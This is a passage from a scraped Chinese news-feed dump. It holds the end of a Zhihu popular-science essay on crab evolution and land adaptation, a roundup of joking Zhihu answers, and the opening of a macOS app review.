crab revolution)</p>\n<p>十足目适应性辐射的原因很多，除了上文中提及的体态上的蟹化与生殖系统上的内化受精囊，蟹类在运动、呼吸、神经、循环等等方面都有着独特而优异的构造。其中既有甲壳亚门家族从祖先继承下的遗产，也有蟹类内部独有的进化创新</p>\n<p><strong>循环系统：近闭管</strong></p>\n<p>历史上我们曾一直认为，甲壳类动物的循环系统与昆虫和蛛形纲一样的开管循环，即血管并不封闭，组织直接浸润在从动脉泵出的血淋巴中。但近二十年来的研究显示，十足目动物有着相当复杂的血管网络系统<sup>[6]</sup>：</p>\n<ul>\n<li>虾蟹可以通过心脏神经节和中枢神经系统的神经输入或神经激素实现对心脏的联合控制，这允许快速调节心输出量，血压已经足以和部分鱼类及两栖类媲美</li>\n<li>十足目的心脏加速神经和心脏抑制神经为心脏神经节提供输入，调节心肌收缩的速度和力量，这与脊椎动物控制心脏的交感神经（兴奋）- 副交感神经（抑制）调节机制如出一辙</li>\n<li>作为局部血流的调节机制，脊椎动物的动脉外包裹有平滑肌。十足目动物的动脉没有平滑肌，取而代之的，它们另一项独树一帜的进化创新：节段动脉系统（segmental arterial system）代替完成了这一任务。<strong>每段动脉底部都有一对由多种神经激素调控的肌肉心脏动脉瓣，控制血淋巴在局部血管中的流量</strong>\n</li>\n<li>整体上看，十足目动物从心脏发端出五组动脉系统，拥有广布全身的毛细血管样血管，并且<strong>在脑部及触角腺内实现了与真正的毛细血管网相同的闭环血管网络</strong>\n</li>\n<li>十足目甲壳类动物缺乏完整的静脉系统，血淋巴在流入大静脉并返回心脏之前会汇集在血窦<sup>[7]</sup>中。这些血窦曾经被定义为“难以描述的腔室”，并作为将十足目循环系统分为开管循环的依据，但最近的研究表明，这些血窦实际上形成了一套类似毛细血管网的腔隙网络，两者在形态与功能上的界限已经不再明确</li>\n</ul>\n<figure><img src=\"https://pica.zhimg.com/v2-6d01c4a9e7a9a0c2fba32552e84570b5_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图为蓝蟹循环系统的造影，可以看出它们有着复杂的循环系统。b，c 分别是触角腺及鳃部的局部血管网图像。CCA- 体腔囊动脉; CH - 薄片状的几丁质交换表面；HC - 血淋巴通道； PC - 柱状细胞</figcaption></figure><p>事实上，“开管循环”包含了一系列复杂度差异极大的循环系统模式，而头足类与十足类动物的循环系统在效果上已经被学界描述为“近闭管”（incompletelyclosed）的。强劲的心脏，复杂的血管网以及节段动脉系统等一系列调节手段，让十足目得以成为当今地球上体型最大也是最活跃的一批节肢动物</p>\n<p><strong>神经系统：脑部重塑与社群行为</strong></p>\n<p>与大众观念不同，节肢动物也有属于它们的脑，所谓的蕈状体（mushroom body）。在一些表现出复杂社群行为的类群，譬如社会性膜翅目昆虫的蕈状体被认为能实现抽象、推理、学习以及情感等所谓的高级思维活动<sup>[8]</sup>；而在甲壳类动物内部，口足目的一些虾姑也被证明有着发达的蕈状体</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-869612d17d6ed696a646d80f6c5d6454_720w.jpg?source=8673f162\" alt=\"\"><figcaption>西方蜜蜂的脑部 3D 图像，紫色部分即为蕈状体，而顶部四个大号的杯状构造就是蕈状体的萼。目前认为，萼越发达的节肢动物，认知能力也越强大</figcaption></figure><p>但在其他具备复杂行为的节肢动物中花草丰茂的蕈状体，到了我们关心的十足目中却变得光溜溜一片，那些促进个体记忆与认知能力的“花萼”与“枝叶”都不同程度地退化消失了；而在蟹类中，原本蕈状体所在的区域更是空空荡荡</p>\n<p>这样看来，螃蟹们似乎是节肢动物中的低能儿，呆瓜中的呆瓜。但对脑部的三维扫描以及一系列生理信号实验却发现事情并没有看上去那么简单<sup>[9]</sup>：取代了蕈状体位置的是几团来源不明的神经纤维，表面却像人脑一样布满沟回，而就在这些神经纤维下方，我们检测到了蕈状体特有的生化反应</p>\n<p><strong>它们的蕈状体被埋起来了！</strong></p>\n<p>在螃蟹脑中，一双倒扣在脑区深处的蕈状体又重新长出了萼与小叶，就像两束倒生的花朵肆意地与周遭的脑区交融在一起，昆虫及甲壳类中所有已知的神经排列方式都影影绰绰藏匿其中；而把它们埋起来的神经纤维也浮现出类似人类脑皮的沟回，并与蕈状体伸出的小叶深度融合，同样呈现出丰富的连接方式。废土之下，别有洞天</p>\n<p>这一奇妙的脑部重塑事件在动物界甚至还存在一个趋同进化的案例，并且更不可思议的是，这个案例就是我们自己：海马体在如龟类等其他脊椎动物中就如同屋顶般在脑的上表面铺展开，但<strong>哺乳动物的海马体像包饺子一样被内卷入脑区深处</strong>，而那层厚到能叫饺子店关门的“饺子皮”，恰恰就是我们引以为傲的新脑皮。事实上，蕈状体与海马体在解剖构造、同源基因表达、抗体免疫测试以及承担的认知功能上都十分类似，这意味着两者可能有同一起源或者说，<strong>原口动物与后口动物的最近共同祖先可能已经有了较为完备的空间记忆能力</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8649d4ed6237cd7dc822171c0c1d7161_720w.jpg?source=8673f162\" alt=\"\"><figcaption>不同类群的脊椎动物的脑部(A，C)与甲壳类动物脑部的比较(B，D)，Hi，海马体；Ca，蕈状体的萼部；Gy，脑回样组织</figcaption></figure><p>但让我们先放下这条迷人的线索，把目光移回那些短尾巴大背甲的虾爬子身上：体积足够大的蕈状体不但承担着记忆空间位置的职责，还与一部分社会性行为相关联。是的，一些螃蟹已经被证实有着基础的社会性行为</p>\n<p>当生境中的食物来源近似均匀分布时，欧洲滨蟹就是各自为政的一盘散沙；但若食源呈现出空间特异性分布时，滨蟹们就会以个体对探索外界的意向为分化依据，自发形成特殊的社群关系：对探索较为消极的滨蟹会集结成一个个小群体，跟着大部队活动；而积极探索的滨蟹则会成为联络各个小群体以及落单个体的情报中心，或者说“守门人”（gatekeepers）。这样的社群结构似乎能让每个个体都能从中及时获得食源信息，在没形成社群的案例中，活跃的滨蟹总是先一步享用食物；但在社群中，其他的滨蟹几乎同时接踵而来。虽然它们对自己的社会身份没有意识，这无疑是有别于一群无头苍蝇的社会行为</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9cec5b006d7a870c4aac321e6a09aba6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>欧洲滨蟹 Carcinus maenas 也是第一种被确认能记住复杂迷宫路线的十足类动物</figcaption></figure><p><strong>十足目动物群的演替</strong></p>\n<p>除了上述的两种最为惊人的进化事件，螃蟹还有很多在生存竞争中大显神威的独特构造，譬如在蜕壳后的软壳期代替外骨骼支撑肢体运动的静水骨骼 / 气水混合骨骼系统<sup>[10]</sup><sup>[11]</sup>，借由外骨骼的虹彩反射及振动交流沟通的行为等等等等。在耗费整个侏罗纪的韬光养晦后，这些全副武装的奇迹装甲终于在白垩纪迎来了属于自己的日出</p>\n<p>十足目动物最早的化石记录可追溯到泥盆纪，也就是说它们的历史几乎和四足动物一样悠久，但在很长一段时间里，十足类的化石记录都没有显示出像四足类脊椎动物那样波澜壮阔的兴衰史：异尾下目的伪蟹和矮龙虾自诞生伊始就一直安居在珊瑚礁和海流活跃的硅质海床上，蝼蛄虾与海蛄虾则终年沉沦在静水的洼地泥泞中；无螯下目的龙虾对水流要求不严，在全新世以前漫游在各地的沙质海底，之后则开始染指伪蟹的珊瑚礁；虾与对虾的化石难以定位，但应该与今天一样，是倾向于在开阔水域活动的物种。几个分支从一开始就各得其所互不侵犯，在漫长的静好岁月里一直维持着小而稳定的种群</p>\n<p>直到螯虾下目、肢孔类蟹类以及真蟹派下的异孔亚派三个演化支陆续登场后，事情变得热闹起来了。化石记录显示，三个类群都曾占据过整个十足目动物群中的主体，彼此都在千万年的尺度上呈现出潮涌潮枯般缓慢但鲜明的演替关系</p>\n<ul>\n<li>螯虾下目在早期十足目动物群中有着相当高的占比，到中侏罗纪时至少达到了 43%，但在晚侏罗纪这个数字就降到了 40%以下，到了早白垩世的阿尔布期(Albian，距今约 1.1~1 亿年前)则降至 20%；从进入全新世至今，它们在十足目中的占比只有 1%</li>\n<li>肢孔派蟹类最早出现于早侏罗世的普林斯巴期(Pliensbachian，距今 1.91–1.83 亿年前)，在此后的整个侏罗纪直至早白垩世稳定占据十足类动物群的 20~30%，到了晚白垩世则增长至 30~40%；但进入新生代后，肢孔派的占比一直在缩减，自全新世伊始直至今日，只占十足目的 6%</li>\n<li>异孔亚派蟹类出现于 1.4 亿年前的早白垩世，并在晚白垩世逐渐增加，于中生代结束前的马斯特里赫特期占到整个十足类动物群的 24%；进入新生代后，约有一半的十足目化石物种都被确认属于异孔亚派，而现存的异孔亚派物种占到了整个十足目物种的 36%</li>\n</ul>\n<p>任何在海中获得优势地位的物种都不约而同地想要踏上陆地的起跑线，蟹类也不例外。在获得在海底横行霸道的一身本事的同时，一些螃蟹的步足也开始爬入河口，爬上滩涂，爬上亿年前的节肢同族们走过的路</p>\n<hr>\n<p><strong>第六次登陆</strong><strong>引子：圣诞岛上的长征</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-740667b7af91691c0c1c396994a97a6a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>正在取食枯叶的圣诞岛仿地蟹</figcaption></figure><p>时至今日，圣诞岛仿地蟹 Gecarcoidea natalis <sup>[12]</sup>和它们壮丽的繁殖远征对全球关注动物的网民而言已经不再陌生，这也让它们成为大部分人认识的第一种半陆生蟹类</p>\n<p>圣诞岛仿地蟹是圣诞岛上 14 种陆蟹中数量最多的一种(显然)，全岛估计约有 4370 万只成蟹。它们一生中最初的三四个星期是以浮游生物的姿态在海中度过，并在被海浪推上岸后 1~2 天蜕变为 5 毫米的袖珍版红蟹，之后的三年里，幼蟹将自己隐藏在岩缝、朽木与落叶堆中，这之后又要两年才能性成熟。成熟的红蟹栖息于森林的树荫下或地洞中躲避酷烈的日晒，以掉落的花果与腐叶为食。但每到一年的十月至十一月，雨季来临之时，雌蟹们就会在连绵的阴云和雨幕中开始为期数周的大迁徙，并在玉轮半亏之际<sup>[13]</sup>为了释卵而投身入那早已不再接纳自己的海水中</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-3971862b914752c1b66488583ab37b4b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>当地人为防止迁徙中的红蟹大军经过马路，在两旁立起屏障</figcaption></figure><p>这一眼望不到头的红色海洋固然震撼，却不似看上去的那样浩渺无穷：随货轮偷渡到岛上的长足捷蚁会大量捕杀上岸的幼蟹，并向成蟹的眼中喷射蚁酸从而致盲或自残，导致雌蟹无法抵达海岸边。圣诞岛仿地蟹的数量逐年减少，如果再不能有效管制住捷蚁们，这酒红色的舞会就是薄暮时的残阳</p>\n<p>同时，圣诞岛仿地蟹的迁徙在让人感慨的同时也令人疑惑：一只红蟹长达二十余年的生命周期中，只有不到一个月的时间是在海中度过的。可就是一生中最初的这 1/240，却叫已经适应陆地生活的雌蟹每年都要费尽千辛万苦回到岸边，并冒着被淹死的危险泡进海水中释卵。祖先和同族们一样是海生物种的红蟹们是如何在陆地上生活的呢？以及明明已经快要能够完全登陆了，却在最后一步停滞不前呢？</p>\n<p>任何水生动物在转向完全陆生的演化过程中都要克服四道难关：呼吸、保水、氮代谢和繁殖。在本章中我们将展示，以红蟹与椰子蟹等陆蟹为代表的蟹类们在完全登陆的过程中遭遇了什么问题，而进化的钟表匠又是用怎样的方式老瓶装新酒，让陆蟹祖先们代代相传的构造焕发新的生机；另外，笔者还将把与其他类群中进化出的解决方案横向比对，看看它们有着怎样千差万别的传承，又是在怎样的选择压力下殊途同归</p>\n<p>* 在本章节提及的“陆蟹”除了短尾下目外，还将包含异尾下目的椰子蟹等伪蟹</p>\n<p><strong>呼吸、保水</strong></p>\n<p>能呼吸空气对于登陆的意义不言而喻，而减缓体内水分的蒸发则几乎是同等重要的课题。事实上，对于处在水陆两栖的过渡阶段的物种来说，<strong>在空气中呼吸与保水某种意义上是同一件事</strong>：水生动物的呼吸器官是鳃，而鳃主要的呼吸部就是那一排排透着体液的鳃丝。因为浮力的作用，鳃丝在水中能够长得长而柔顺，以增大与水体的接触面积。但在空气中时，鳃丝会因为重力与水的浸润作用粘连在一起，极大地减小与空气的接触面积；同时，因为需要源源不断的水流才能维持供氧，鳃在水生动物中往往是露出体外的，所以当暴露在空气中时，鳃丝表面将因水分的持续蒸发而无法保持湿润，这对吸收溶解氧的鳃部是致命的</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-764c8dc24b3f21309663c97bef53c51e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>鳃孔是所有脊索动物的祖征，而在以辐鳍鱼为代表的有颌类脊椎动物中，鳃孔演化为鳃裂，以便水流穿过鳃丝</figcaption></figure><p>相比之下，维持全身的水分不至于迅速蒸发反而不是那么必需的工作：只要生活在足够湿润的地区就行了，譬如蜗牛、蛞蝓等动物就以湿答答的身体挺进了内陆。更有甚者如纽虫、扁虫、水熊虫、蚯蚓和蛭，这一类登陆者讨巧地利用空气或土壤中充裕的水汽，回归成了祖先们进化出专性呼吸器官之前直接用体表呼吸的生活方式。但对于活跃在阳光之下的动物们，这一招肯定行不通。所以<strong>内化呼吸器官</strong>就成了它们的必经之路：</p>\n<ul>\n<li>四足类动物祖先食道上的鳔演变为肺，原本暴露于体表的两对鼻孔中的一对移入口中成为内鼻孔，原本的鳃裂则在胚胎时期就已愈合，留下的鳃弓将在日后成为各种喉舌活动的助力</li>\n<li>昆虫与栉蚕的体壁内陷形成由几丁质衬里支撑的深入体内的气管，体外的空气通过气管的多级分支直接与组织器官交换气体</li>\n<li>蛛形纲与等足目在海中的祖先用泳足特化而来的书鳃呼吸，而登陆者们的书鳃硬化并被包进体内，成为了书肺</li>\n</ul>\n<p>而对于内化呼吸器这一点，陆蟹们可算是赢在起跑线上了，得益于软甲纲继承的祖征，还在水中时蟹类就已经具有内化的呼吸器官：远古的节肢动物有着双肢型的附肢，但由于呼吸部太过脆弱使得整个肢体都无法剧烈活动，各类节肢动物都在往后的时光中由于适应活跃运动生态位的选择压力而简化为了单肢型，只有甲壳亚门保留下了这种原始的性状。而十足目将呼吸用的鳃部分折入躯干下方，将运动部和呼吸部从连锁中解放了出来；而蟹化中腹面的几片胸甲融合而成的胸铠又营造了一个腔室，将下方的鳃足收纳进去，就成为了鳃室</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-da793bb66c2c1d81693e46a12059f82d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>三叶虫的步足就是典型的双肢型附肢</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-400a985975a3351d2fa8427980d0c24a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>吃螃蟹的时候，拨开螃蟹壳就能看到两侧一条条的鳃，那其实就是折叠入鳃室的呼吸部</figcaption></figure><p>有了这笔丰厚的遗产，陆蟹们接下来的工作就要简单多了：圣诞岛仿地蟹鳃部的几丁质加厚硬化，并在鳃丝之间生出隔板，从而撑起鳃丝，使之在空气中也能维持舒展的形状。即使是一些海蟹也能借着这个鳃室直接贮藏水分，从而像蛙人一样在陆地上活动较长时间；但另一些陆蟹和陆寄居蟹更进一步，作为胸甲演变而来的产物，鳃盖原本的功能只是提高鳃室的密闭性，降低鳃室中水分的蒸发速率，但张口蟹属和椰子蟹等陆蟹鳃盖上的血管网变得异常发达，并构造出复杂的三维结构，最终使整个鳃室成为了功能意义上的肺</p>\n<p><strong>【此处应有图】</strong></p>\n<p>同样重要的，陆蟹们在前文中提及的“近闭管循环系统”的基础上更进一步，进化出了“肺循环”和 / 或“鳃循环”路径。这让陆蟹们的血淋巴初步有了动脉血和静脉血的分野，能够更加高效地输送氧气与废气。至于全身保水，这本就是拥有外骨骼的节肢动物的强项，蟹类们几乎只需单纯地加厚这层外壳就可以了</p>\n<p><strong>【此处应有图】</strong></p>\n<p><strong><strong>氮代谢</strong></strong></p>\n<p>得益于氨在水中的高溶解度，生物们早在几十亿年前那个只有细菌的年代，就进化出了将废氮以氨的形式排出体外的本领，大部分水生动物也保留了这一特征，将氨从体表或鳃直接排出去；而<strong>硬骨鱼类失去了这条代谢路径的最后步骤</strong>，<strong>代谢的终产物到尿素为止</strong>，但尿素同样是种易溶的物质，所以在水中的排泄方式与前者并无太大不同</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-4323c3db2781a99fbb3e639920cda2a3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>鲨鱼将废氮以氨的形式借由渗透压从体表排出，所以捕捞上来的鲨鱼总是弥漫着一股尿骚味</figcaption></figure><p>但在陆地上这行不通。所以登陆者们纷纷踏上了同一条路——<strong>截短祖先的氮代谢路径</strong>，<strong>将尿素、尿酸、尿囊素等过去的中间产物排出体外</strong>：</p>\n<ul>\n<li>哺乳动物氨基酸代谢的终产物是尿素，而非灵长哺乳类的嘌呤代谢终产物是尿囊素，灵长类则是尿酸</li>\n<li>包括鸟类在内的蜥形纲最终产物是尿酸，排出固态的尿酸结晶使得它们能保留更多的水分；此外，一些蜥形纲动物也会直接排泄鸟嘌呤</li>\n<li>昆虫的氮代谢终产物种类丰富，并因具体类群与年龄段而变化：尿素（蚊等)、尿酸(吸血昆虫、蝗虫、鳞翅目幼虫、螳螂等)、尿酸盐(蜚蠊等)、尿囊素(食肉双翅目)、氨(蜚蠊、蝗虫、部分双翅目幼虫等)、铵盐(果蝇幼虫等)乃至直接排出游离氨基酸<sup>[14]</sup>\n</li>\n<li>与蜥形纲类似，蛛形纲物种的废氮多以尿酸与鸟嘌呤的形式排出，一些蝎子的毒液中就有较高含量的尿酸<sup>[15]</sup>\n</li>\n</ul>\n<p>回到蟹类身上，异尾下目的椰子蟹是唯一已知的能排泄尿酸的陆蟹，其他陆蟹都保留了氨代谢，将氨在体内富集至一定量后，将身体浸泡在水洼中通过鳃排出，，亦或是直接间歇性地挥发出氨气。但另一些陆蟹则直接排出溶有氨的水，形成特殊的“氨尿”，它们还进化出了类似肾脏重吸收的机制，初级尿液经过鳃室时，鳃会重吸收其中溶解的无机盐以降低体内离子的损耗</p>\n<p><strong>【此处应有图】</strong></p>\n<p>然而纵使在离海的险程中出尽百宝，纵使有了如此完备的呼吸与排泄系统，就如开头的圣诞岛仿地蟹那样，这些陆蟹们全都止步在了完全登陆的终点线之前的最后一道关隘——繁殖</p>\n<p><strong>繁殖</strong></p>\n<p>十足目往往位于海洋营养级中下层的位置，即便是成年的蟹类在很多时候都自身难保，更别提保护后代了。海生的蟹类一次产下大量的卵，让刚孵化的后代乘着海流迅速扩散，以防止被掠食者一网打尽。作为这一特征的遗留，即使成体已经能在陆地上行动自如，地蟹科的物种在降生伊始依然要经历浮游特化的溞状幼体和大眼幼体阶段，它们也因此无法远离大海，只能带着一身好装备定居在海岸边或是偏远的小岛上</p>\n<p>迈出了这最后一步，真正挺进内陆的类群是淡水蟹类。有人说它们出现于两至三百万年前，新近纪与第四纪的交界处；也有人说它们早在冈瓦纳大陆尚未分裂时就已经诞生，但不管怎样，这些另辟蹊径的偏师劲旅才是这场赛道上今日天的赢家。<strong>内陆支离破碎</strong>，<strong>变幻莫测的水体环境使开拓者们得以借助自身水陆两栖的优势躲开那些盘踞在深水中的鱼类</strong>，<strong>但也让只适用于开阔水域的浮游虫海战术无地可施</strong>，淡水蟹栖身的泥沼、乃至树洞中那随时可能干涸的积水根本不足以支持大量幼体的存活。进退两难之间，淡水蟹的祖先最终也经过了其他陆生动物都走过的路：它们产出的不再是数以万计的卵籽，而是数十颗饱满厚实的大卵，借着其中充沛的卵黄，本应以浮游幼体姿态孵化的后代在卵中度过浮游期，直接以幼蟹的姿态降生</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-930fa0168daf8faf14130e99a16d1f4d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>释卵中的奥氏后相手蟹 Metasesarma aubryi，它们也是成体陆生幼体海生的类型</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-f112be5d2aaab2bbca9508257c537915_720w.jpg?source=8673f162\" alt=\"\"><figcaption>溪蟹的后代则直接在母体的育儿室中发育为幼蟹</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-e670db813011599acef3217219d5e4b7_720w.jpg?source=8673f162\" alt=\"\"><figcaption>大卵发育是趋同进化的典型案例，今天的许多蛙类也会采用相同的策略，大卵孵化出的不再是蝌蚪，而是一个个小蛙</figcaption></figure><p>终于，乘着这最后的一阵东风，溪蟹总科与部分相手蟹科的淡水蟹类得以大步踏上深入腹地的旅程。在阴凉的山间森林里，时常可以看到抱着大卵踱步的雌性溪蟹的身影，内溪蟹等物种高度特化，已经几乎摆脱了对水体的依赖；蜕皮时需要的水分也不再是制约的桎梏，树卡尼蟹<sup>[16]</sup>、陆相手蟹等热带物种凭着树洞、空气凤梨乃至猪笼草中的一汪积水，向雨林中遮天蔽日的树冠层挺进；平原龙溪蟹沿着隋炀帝为南下开通的京杭大运河一路向北至华北平原，成为纬度分布最高的淡水蟹</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e76824d9c7f26a2d1b0a21d74a716cff_720w.jpg?source=8673f162\" alt=\"\"><figcaption>生活于古罗马遗迹中的溪蟹 Potamon fluviatile</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-6cb51bcbd679ef03814277c787d7269a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>只生活在印度西高止山脉森林中的树卡尼蟹 Kani maranjandu</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-f49aa45ebe4ebbe02ae4010b8fffe6b8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>栖息在苹果猪笼草中的马来陆相手蟹 Geosesarma malayanum</figcaption></figure><p>在演化史上，节肢动物门共有五个类群成功登陆并繁衍至今（原回答中笔者漏了端足目，感谢评论区提醒），它们分别是身先士卒的蛛形纲与多足类、后起之秀的六足亚门以及姗姗来迟的等足目与端足目。但对十足目动物采用空气呼吸的初步评估通常明确地鼓励了这样一种观点，即现存的螃蟹物种可能包括从完全水生到陆生的生理连续体，以某种方式体现了呼吸空气进化的过渡状态。笔者有信心认为，今天的我们正身在节肢动物第五次进军陆地的大潮中</p>\n<hr>\n<p>至此，软甲纲中最繁盛的类群，那些在餐桌上掀开蟹壳时就已无数次亲眼目睹，却在简中世界依然鲜为人知的奥秘，在这篇回答中由笔者轻轻揭开了一角。每一个生命都是一个不朽的传奇，每一个传奇都是一个精彩的故事，希望这篇回答能让更多人赞叹自然的复杂与壮丽，感动于大千世界中众生的美丽</p>\n<p><strong>【此处应有图】</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/463482216\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738786"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-08-02 23:06:57","description":"\n<div>\n<h2>你经历过最害羞的事是什么？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-c1e5f0c26c97999713a07772499417c6_l.jpg?source=8673f162\"><span>JXYI，</span><span>xix</span>\n<a href=\"https://www.zhihu.com/question/305577638/answer/564970930\" hidden>阅读原文</a>\n</div>\n<div>\n<p>六年级时扫男厕所 ，姨妈来了。。。然后我在男厕所换了姨妈巾，第二天学校在传男的当中有阴阳人</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/305577638\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>怎样看待「身材都无法控制，还如何控制人生」这句话？</h2>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-988aa3ad722ef78583f328301864624f_l.jpg?source=8673f162\"><span>图总裂夫司机，</span><span>纯土鳖</span>\n<a href=\"https://www.zhihu.com/question/48227005/answer/110165918\" hidden>阅读原文</a>\n</div>\n<div>\n体重都承受不住，如何承受压力？<br>（这类鸡汤段子的问题，是把一点点道理吹成一个巨大的泡泡）\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/48227005\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>如何看待暨南大学苏炳添副教授以自己为例发表中国男子 100m 短跑论文？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/6f0a13de9_l.jpg?source=8673f162\"><span>独孤蓑笠翁</span>\n<a href=\"https://www.zhihu.com/question/476669367/answer/2034235169\" hidden>阅读原文</a>\n</div>\n<div>\n<p>第一个冒出来的想法：苏老师真真是在跑数据 </p>\n</div>\n</div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/4d8ee766d9c2aa198fbd126e16e13dd4_l.jpg?source=8673f162\"><span>Michael Jackson，</span><span>微信公众号 【修罗笔记】，欢迎大学生、研究生关注</span>\n<a href=\"https://www.zhihu.com/question/476669367/answer/2034772349\" hidden>阅读原文</a>\n</div>\n<div>\n<p> </p>\n<hr>\n<p><a href=\"https://zhuanlan.zhihu.com/people/michael-jackson-4\" target=\"_blank\" rel=\"noopener noreferrer\">@Michael Jackson</a> ：</p>\n<p>原来苏炳添参加奥运会的真实目的是刷 C 刊论文，现在的科研界太卷了！</p>\n<p> </p>\n</div>\n</div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户</span>\n<a href=\"https://www.zhihu.com/question/476669367/answer/2034292847\" hidden>阅读原文</a>\n</div>\n<div>\n<hr>\n<p>知乎用户：</p>\n<p>苏教授您好，请及时更新实验数据</p>\n<p>据我了解，最近的测试数据表明，中国男性在 31 岁的年龄，可以跑到 9 点 83 秒的成绩</p>\n<p>希望您持续关注行业动态，不要用过去的数据想当然的得出结论，谢谢</p>\n<p>对了，那个人也叫 Su，建议您及时联系他，获得第一手数据</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/476669367\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>日本餐馆盘子真的是洗七次吗？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-f2b03353a32a3f56a890d4c276e11af9_l.jpg?source=8673f162\"><span>京鹿子，</span><span>专注正版模玩手办</span>\n<a href=\"https://www.zhihu.com/question/31494623/answer/2025813691\" hidden>阅读原文</a>\n</div>\n<div>\n<p>是的。</p>\n<p>我就是那个盘子。</p>\n<p>平时我很少说话，因为盘子不能说话。</p>\n<p>近几天他们总是用福岛的核废水洗我，我才逃出来，到网上和你们聊天的！！！</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/31494623\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>苹果的 AirPods 充电盒可以刻字了，你会刻什么字？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-2675582b76e7989c911540f3fa7cdbe4_l.jpg?source=8673f162\"><span>肖战刘宇和华莱士，</span><span>肖战割割和刘宇割割加油鸭！一起成为喷射战士吧！</span>\n<a href=\"https://www.zhihu.com/question/316787077/answer/628488462\" hidden>阅读原文</a>\n</div>\n<div>\n<p>如何让他变成一个十元的耳机盒</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9a28181df17f8b45582cbc2be7b709e0_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/316787077\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9738807"},{"title":"派评 | 近期值得关注的 App","date":"2021-08-02 09:48:57","description":"\n<p>本期《派评》内容有：</p>\n<ul>\n<li>macOS 上简单好用的音视频格式转换工具：OmniConverter。</li>\n<li>好用的 iOS 本地音乐播放器 Doppler 推出 macOS 版本。</li>\n<li>NOMO 团队视频拍摄工具 Protake 大更新，支持多机位监视器功能。</li>\n<li>……</li>\n</ul>\n<p>你可以通过文章目录快速跳转到你感兴趣的内容。如果发现了其它感兴趣的 App 或者关注的话题，也欢迎在评论区和我们进行讨论。</p>\n<h2>不容错过的新 App</h2>\n<h3>OmniConverter：Mac 上简单好用的全能音视频转换器</h3>\n<ul>\n<li>平台：macOS</li>\n<li>关键词：格式转换、音视频转换、视频压缩</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@化学心情下2\" user-id=\"bs2od75b34tch2730oa0\" href=\"https://sspai.com/u/liuxiaofengone\">@化学心情下2</a>：虽说不少朋友现在已经主要看流媒体视频，但在工作中我们也时常还是会遇到音视频转换等问题，这往往就需要通过各种软件工具来实现。如果从简单易用的角度来说，今天介绍的这款名为 OmniConverter 或许会让复杂的转换过程变得简单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c43ropdb34tarbb3pir0.png\"></figure><p>OmniConverter 只有三个功能：转换视频格式、压缩视频的体积、音频格式的转换。首先是视频转换，你需要做的只有将需要转换的视频文件拖到窗口中，然后你可以在转换信息中对转换的格式、音轨以及字幕的添加做出选择，除了格式选择之外，我们还可以对视频转码的设置进行进一步的编辑，比如说帧数、编码器、比特率等等都可以调整，并且还可以预估得到转换出的视频的体积以及大小。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c43roplb34tarbb3pirg.png\"></figure><p>我尝试将自己录制的电视节目（ts 格式）的视频文件通过 OmniConverter 转换成 MP4 格式，在画质不压缩只降低比特率的情况下，原先的 12.66GB 的文件预估转换后的文件大小在 4.67GB，在 M1 芯片 Mac 下，转化大约需要 20 分钟的时间就可以完成，考虑到并没有全速进行转换（CPU 占用率只有 25%），这个效率其实还是可以接受的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c43roptb34tar307kr9g.png\"></figure><p>视频压缩顾名思义就是将视频的体积进行压缩， 在 OmniConverter 上操作也非常简单易懂（比起 ffmpeg 的各种参数命令要简单的多），文件拖动到窗口中，然后点击编辑调整输出的画质、分辨率、比特率以及帧数，并且通过各种编辑可以非常直观的看到输出视频体积的变化。</p>\n<figure class=\"image ss-img-wrapper\"><img 